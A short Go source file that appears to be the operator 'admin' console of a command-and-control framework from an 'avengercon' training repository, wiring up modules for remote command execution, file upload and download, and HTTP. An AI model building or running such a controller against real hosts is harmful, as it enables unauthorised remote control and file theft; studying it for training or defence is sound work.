package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/1stl0ve/avengercon/pkg/admin"
	"github.com/1stl0ve/avengercon/pkg/module/exec"
	"github.com/1stl0ve/avengercon/pkg/module/file"
	"github.com/1stl0ve/avengercon/pkg/module/http"
)

func main() {
	port := flag.Int("admin", 9090, "the port to listen for incoming clients")
	serverAddr := flag.String("addr", "127.0.0.1", "the ip address to bind to")
	flag.Parse()

	// default address is localhost:9090
	addr := fmt.Sprintf("%s:%d", *serverAddr, *port)

	// create the new admin client
	adm, err := admin.New(addr)
	if err != nil {
		log.Panicln(err)
	}

	// add the modules that we want
	adm.AddModule("cmd", &exec.Admin{})
	adm.AddModule("download", &file.Admin{})
	adm.AddModule("upload", &file.Admin{})
	adm.AddModule("http", &http.Admin{})

	// start the admin client
	adm.Run()
}
